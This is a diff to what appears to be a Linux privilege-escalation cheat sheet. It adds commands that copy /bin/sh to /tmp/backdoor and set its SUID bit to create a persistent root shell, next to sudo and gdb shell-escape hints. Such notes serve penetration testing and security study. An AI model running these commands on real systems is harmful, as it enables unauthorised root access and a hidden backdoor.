@@ -4,6 +4,12 @@
 sudo -l #what access? if you have access to debuggers ex /usr/bin/gdb - sudo gdb && shell - it couldn't be that easy
 sudo su #it couldn't be that easy
 
+--# LINUX Set UID BIT #--
+cp /bin/sh /tmp/backdoor
+chmod 4111 /tmp/backdoor #set the SUID bit, making the file run with owner permissions rather than user permissions
+ls -l /tmp/backdoor
+---s--x--x #S = SUID bit
+
 
 -----------# JOHN - NIX #-----------
 
